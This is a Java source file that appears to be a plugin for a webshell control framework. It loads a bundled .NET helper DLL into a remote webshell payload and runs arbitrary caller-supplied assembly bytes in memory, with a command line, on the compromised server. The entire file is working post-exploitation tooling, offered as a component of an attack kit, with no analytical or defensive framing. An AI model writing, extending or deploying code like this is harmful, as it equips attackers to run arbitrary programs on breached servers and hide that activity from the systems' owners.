package shells.plugins.netcore;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ExecuteAssembly;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
        payloadName = "NetCoreDynamicPayload",
        Name = "InlineExecuteAssembly",
        DisplayName = "ExecuteAssembly"
)
public class NExecuteAssembly extends ExecuteAssembly {
    private static final String CLASS_NAME = "ExecuteAssembly.Run";
    private boolean loaded;

    public NExecuteAssembly() {
        this.loaded = false;
    }

    private boolean ensureLoad() {
        if (!this.loaded) {
            this.loaded = this.payload.include(CLASS_NAME,
                    functions.readInputStreamAutoClose(NExecuteAssembly.class.getResourceAsStream("assets/ExecuteAssembly.dll")));
        }
        return this.loaded;
    }

    public byte[] runAssembly(byte[] data, String commandLine) throws Exception {
        if (!this.ensureLoad()) {
            return "Unable to load plugin".getBytes();
        }
        ReqParameter parameter = ReqParameter.createInvokeMethodReqParameter();
        parameter.add("assemblyBytes", data);
        parameter.add("commandLine", commandLine == null ? "" : commandLine);
        return this.payload.evalFunc(CLASS_NAME, "run", parameter);
    }
}
